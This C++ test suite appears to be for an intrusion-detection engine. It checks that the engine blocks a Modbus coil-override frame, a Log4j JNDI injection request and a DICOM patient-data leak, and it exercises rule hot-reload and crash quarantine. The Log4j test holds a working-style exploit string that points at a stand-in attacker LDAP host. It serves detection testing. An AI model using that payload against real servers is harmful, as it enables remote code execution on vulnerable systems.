#include <iostream>
#include <chrono>
#include <thread>
#include <cassert>
#include <cstring>
#include <filesystem>
#include "sdk/PluginSupervisor.hpp"

using namespace sentinel::sdk;

static void mock_log(int level, const char *sender, const char *msg)
{
    const char *lvl_str[] = {"DEBUG", "INFO", "WARN", "ERROR"};
    std::cout << "[" << lvl_str[level] << "] (" << sender << ") " << msg << std::endl;
}

static int mock_drop_ipv4(uint32_t /*ipv4*/, uint32_t /*dur*/) { return 0; }
static void mock_emit_metric(const char * /*name*/, uint64_t /*val*/) {}

static uint64_t mock_time_ns()
{
    return std::chrono::duration_cast<std::chrono::nanoseconds>(
               std::chrono::steady_clock::now().time_since_epoch())
        .count();
}

int main()
{
    std::cout << "============================================================" << std::endl;
    std::cout << "   SENTINEL EXTENSIBILITY SUBSYSTEM PRODUCTION SUITE        " << std::endl;
    std::cout << "============================================================" << std::endl;

    SentinelHostInterface host{};
    host.engine_version = 10000;
    host.log_message = mock_log;
    host.request_ebpf_drop_ip = mock_drop_ipv4;
    host.emit_metric_counter = mock_emit_metric;
    host.get_monotonic_time_ns = mock_time_ns;

    PluginSupervisor supervisor(host,
                                "/etc/sentinel/plugins.d",
                                "/etc/sentinel/rules.d",
                                "/etc/sentinel/wasm.d");

    if (!supervisor.initialize())
    {
        std::cerr << "[-] Failed to initialize supervisor!" << std::endl;
        return 1;
    }

    std::cout << "[+] Engine Online: "
              << supervisor.native_loader().active_plugin_count() << " Native Active | "
              << supervisor.lua_engine().active_rule_count() << " Lua Active | "
              << supervisor.wasm_sandbox().active_module_count() << " Wasm Sandboxed"
              << std::endl;

    // -------------------------------------------------------------
    // TEST 1: Tier A - Native C++20 Dissector (Modbus FC05 Coil Override)
    // -------------------------------------------------------------
    uint8_t modbus_write[] = {
        0x00, 0x02, 0x00, 0x00, 0x00, 0x06, 0x01, 0x05, 0x00, 0x10, 0xFF, 0x00};
    SentinelRawPacket pkt1{};
    pkt1.data = modbus_write;
    pkt1.length = sizeof(modbus_write);
    pkt1.timestamp_ns = mock_time_ns();

    for (int i = 0; i < 50; ++i)
        supervisor.evaluate_frame(pkt1);

    auto t0 = std::chrono::high_resolution_clock::now();
    SentinelDissectorResult res1 = supervisor.evaluate_frame(pkt1);
    auto t1 = std::chrono::high_resolution_clock::now();
    auto ns1 = std::chrono::duration_cast<std::chrono::nanoseconds>(t1 - t0).count();

    std::cout << "\n[TEST 1] [Tier A: Native C++] Modbus FC05 Coil Override" << std::endl;
    std::cout << "         Verdict: " << res1.verdict << " (" << res1.threat_name
              << ") | Steady Latency: " << ns1 << " ns" << std::endl;
    assert(res1.verdict == SENTINEL_VERDICT_KERNEL_DROP);

    // -------------------------------------------------------------
    // TEST 2: Tier C - LuaJIT Dynamic Rule (Log4j JNDI Exploit)
    // -------------------------------------------------------------
    const char log4j_payload[] = "GET /?user=${jndi:ldap://10.240.0.99:1389/Exploit} HTTP/1.1\r\n\r\n";
    SentinelRawPacket pkt2{};
    pkt2.data = reinterpret_cast<const uint8_t *>(log4j_payload);
    pkt2.length = std::strlen(log4j_payload);
    pkt2.timestamp_ns = mock_time_ns();

    for (int i = 0; i < 50; ++i)
        supervisor.evaluate_frame(pkt2);

    t0 = std::chrono::high_resolution_clock::now();
    SentinelDissectorResult res2 = supervisor.evaluate_frame(pkt2);
    t1 = std::chrono::high_resolution_clock::now();
    auto ns2 = std::chrono::duration_cast<std::chrono::nanoseconds>(t1 - t0).count();

    std::cout << "\n[TEST 2] [Tier C: LuaJIT] Log4j Sliding Payload Match" << std::endl;
    std::cout << "         Verdict: " << res2.verdict << " (" << res2.threat_name
              << ") | Steady Latency: " << ns2 << " ns" << std::endl;
    assert(res2.verdict == SENTINEL_VERDICT_KERNEL_DROP);

    // -------------------------------------------------------------
    // TEST 3: Tier B - Wasm Micro-Sandbox (DICOM PHI Patient Name Leak)
    // -------------------------------------------------------------
    uint8_t dicom_buffer[256];
    std::memset(dicom_buffer, 0, sizeof(dicom_buffer));
    dicom_buffer[128] = 'D';
    dicom_buffer[129] = 'I';
    dicom_buffer[130] = 'C';
    dicom_buffer[131] = 'M';
    dicom_buffer[140] = 0x10;
    dicom_buffer[141] = 0x00;
    dicom_buffer[142] = 0x10;
    dicom_buffer[143] = 0x00;

    SentinelRawPacket pkt3{};
    pkt3.data = dicom_buffer;
    pkt3.length = sizeof(dicom_buffer);
    pkt3.timestamp_ns = mock_time_ns();

    for (int i = 0; i < 50; ++i)
        supervisor.evaluate_frame(pkt3);

    t0 = std::chrono::high_resolution_clock::now();
    SentinelDissectorResult res3 = supervisor.evaluate_frame(pkt3);
    t1 = std::chrono::high_resolution_clock::now();
    auto ns3 = std::chrono::duration_cast<std::chrono::nanoseconds>(t1 - t0).count();

    std::cout << "\n[TEST 3] [Tier B: Wasm Sandbox] DICOM Patient PHI Leak" << std::endl;
    std::cout << "         Verdict: " << res3.verdict << " (" << res3.threat_name
              << ") | Sandboxed Latency: " << ns3 << " ns" << std::endl;
    assert(res3.verdict == SENTINEL_VERDICT_KERNEL_DROP);

    // -------------------------------------------------------------
    // TEST 4: Live Zero-Downtime Hot-Reload (inotify)
    // -------------------------------------------------------------
    std::cout << "\n[TEST 4] [Hot-Reload Engine] Testing zero-downtime rule injection..." << std::endl;
    uint64_t gen_before = supervisor.lua_engine().current_generation();

    FILE *fp = fopen("/etc/sentinel/rules.d/300_threat_test_canary.lua", "w");
    if (fp)
    {
        fputs("Rule = { id = 9999, name = 'CANARY_DYNAMIC_RULE', port = 0 }\n", fp);
        fputs("function Rule.inspect(pkt) return 0 end\n", fp);
        fclose(fp);
    }

    std::this_thread::sleep_for(std::chrono::milliseconds(300));
    uint64_t gen_after = supervisor.lua_engine().current_generation();

    std::cout << "         Generation Shifted: " << gen_before << " -> " << gen_after
              << " (Active: " << supervisor.lua_engine().active_rule_count() << ")" << std::endl;
    assert(gen_after > gen_before);
    std::remove("/etc/sentinel/rules.d/300_threat_test_canary.lua");

    // -------------------------------------------------------------
    // TEST 5: Fault Isolation & Dynamic Crash Quarantine
    // -------------------------------------------------------------
    std::cout << "\n[TEST 5] [Fault Isolation] Dynamically injecting buggy plugin with SIGSEGV..." << std::endl;
    std::filesystem::path crash_plugin_path = "examples/plugins/native_crash_test/build/sentinel_crash_test.so";

    if (std::filesystem::exists(crash_plugin_path))
    {
        // Dynamically load crasher into running engine
        supervisor.native_loader().load_plugin(crash_plugin_path);

        // Use a neutral/benign packet so ModbusGuard passes it and reaches the crasher!
        uint8_t dummy_data[] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66};
        SentinelRawPacket pkt_dummy{};
        pkt_dummy.data = dummy_data;
        pkt_dummy.length = sizeof(dummy_data);
        pkt_dummy.timestamp_ns = mock_time_ns();

        // Dispatch packet to execute through to the crasher and trigger SIGSEGV
        supervisor.evaluate_frame(pkt_dummy);

        size_t quarantined_count = supervisor.native_loader().quarantined_plugin_count();
        std::cout << "         Daemon Survived SIGSEGV! Quarantined Plugins: " << quarantined_count << std::endl;
        assert(quarantined_count >= 1);
    }
    else
    {
        std::cerr << "[-] Error: Crash plugin binary not found at " << crash_plugin_path << std::endl;
        return 1;
    }
    std::cout << "\n============================================================" << std::endl;
    std::cout << " [SUCCESS] All 5 Extensibility & Stability Tests Verified!  " << std::endl;
    std::cout << "============================================================" << std::endl;

    supervisor.shutdown();
    return 0;
}